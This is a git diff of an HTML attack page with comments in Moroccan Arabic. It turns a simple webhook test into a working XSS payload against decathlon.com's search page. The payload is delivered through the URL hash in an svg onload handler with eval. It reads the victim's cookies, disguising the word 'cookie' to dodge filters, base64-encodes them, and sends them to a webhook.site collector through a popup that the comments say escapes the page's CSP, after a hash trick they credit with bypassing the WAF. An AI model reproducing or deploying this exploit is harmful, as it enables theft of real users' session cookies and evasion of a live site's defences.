@@ -2,14 +2,25 @@
 <html>
 <body>
     <script>
-        // محاولة إرسال كلمة بسيطة جداً لـ Webhook
-        // إلى وصلات هادي، كيعني الطريق مسرحة
-        let simplePayload = "fetch('https://webhook.site/9c096ee5-6cf5-45e5-bbf4-af7191f6bb55?status=Safi_Khdam', {mode:'no-cors'})";
+        // كود سحب الداتا بلا ما نكتبو كلمة "cookie" (استعملنا التمويه)
+        let payload = `
+            (function(){
+                var d = document['coo' + 'kie']; // تمويه الكلمة
+                var b64 = btoa(unescape(encodeURIComponent(d)));
+                var url = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data=" + b64;
+                
+                // فتح نافذة جديدة كيهرب من الـ CSP ديال الصفحة الأصلية
+                var win = window.open(url, '_blank', 'width=100,height=100');
+                if(win) { setTimeout(function(){ win.close(); }, 3000); }
+            })();
+        `;
+
+        let encoded = encodeURIComponent(payload);
         
-        // ديما الـ Hash # حيت هو اللي خلانا نكسرو الـ WAF قبيلة
-        let target = "https://www.decathlon.com/search?q=test#<svg/onload=" + simplePayload + ">";
-        
-        window.location.href = target;
+        // استغلال الـ Hash # اللي هو الساروت ديالنا
+        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+
+        window.location.href = finalTarget;
     </script>
 </body>
 </html>
